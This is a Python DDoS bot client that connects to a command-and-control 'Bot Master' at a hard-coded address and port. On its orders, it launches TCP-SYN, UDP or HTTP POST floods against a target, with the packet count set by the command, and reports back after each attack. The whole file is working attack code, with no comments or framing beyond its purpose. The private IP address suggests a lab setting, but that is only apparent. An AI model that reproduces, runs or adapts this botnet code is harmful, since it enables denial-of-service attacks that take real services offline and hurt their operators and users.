import socket
import os
import requests
from random import choice
from string import ascii_lowercase
from scapy.all import*

# Used to start DDoS attack based on the command recieved from the Bot Master
def startAttack(masterCommand, clientSocket):
	a = masterCommand.split()
	if a[1] == 'TCP-SYN':
		targetport=5045
		ip = IP(dst=a[2])
		tcp  =TCP(sport=RandShort(),dport=targetport,flags="S")
		raw = Raw(b"X"*1024)
		p = ip/tcp/raw
		srloop(p,count=int(a[3]),verbose=0)
	elif a[1] == 'UDP':
		targetport=5045
		ip = IP(dst=a[2])
		udp  =UDP(sport=RandShort(),dport=targetport)
		raw = Raw(b"X"*1024)
		p = ip/udp/raw
		send(p,count=int(a[3]),verbose=0)
	elif a[1] == 'HTTP':
		url = "http://"+str(a[2])
		n = 60
		string_val = "".join(choice(ascii_lowercase) for k in range(n))
		for i in range(int(a[3])):
			try:
				r = requests.post(url, data={'key': string_val})
			except requests.exceptions.RequestException as e:
				continue
	if a[1] == '':
		clientSocket.send(str.encode("Invalid Command!"))
	else:
		clientSocket.send(str.encode("Command executed successfully!"))

flag = False
clientSocket = socket.socket()
host = '172.16.28.4'
port = 4441
try:
	clientSocket.connect((host, port))
except socket.error as err:
	pass
connectionStatusMsg = clientSocket.recv(2048)
connectionStatusMsg = connectionStatusMsg.decode("utf-8")
while(flag != True):
    masterMsg = clientSocket.recv(2048)
    masterMsg = masterMsg.decode('utf-8')
    if masterMsg != "STOP":
        startAttack(masterMsg, clientSocket)
    else:
        flag = True

